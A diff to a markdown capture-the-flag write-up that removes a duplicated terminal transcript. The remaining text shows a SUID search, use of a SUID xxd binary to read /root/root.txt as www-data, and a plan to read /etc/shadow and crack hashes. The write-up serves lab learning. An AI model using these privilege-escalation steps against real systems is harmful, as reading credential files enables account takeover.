@@ -78,26 +78,6 @@ In `/home/vianka` We can find the user flag
 ### Root Flag
 
 Now for the root flag by looing for `SUID` we see that `xxd` has an suid bit set so it can run as root by anyone
-www-data@ubuntu:/$ find / -perm /4000 2>/dev/null 
-/bin/ping
-/bin/fusermount
-/bin/mount
-/bin/su
-/bin/ping6
-/bin/umount
-/usr/bin/chfn
-/usr/bin/xxd
-/usr/bin/newgrp
-/usr/bin/sudo
-/usr/bin/passwd
-/usr/bin/gpasswd
-/usr/bin/chsh
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-www-data@ubuntu:/$ xxd /root/root.txt | xxd -r
-thm{xxd_pr1v_escalat1on}
 
 ```
 www-data@ubuntu:/$ find / -perm /4000 2>/dev/null 
@@ -120,8 +100,11 @@ www-data@ubuntu:/$ find / -perm /4000 2>/dev/null
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 www-data@ubuntu:/$ xxd /root/root.txt | xxd -r
 thm{xxd_pr1v_escalat1on}
-
 ```
+
+
+
+
 ### Privilege Escalation 
 
 We got the root flag without even being root but I love to find a way to get root so lets do that.We know that we can read almost anyting with `xxd` so lets try to read `/etc/shadow` and crack the user's hash 
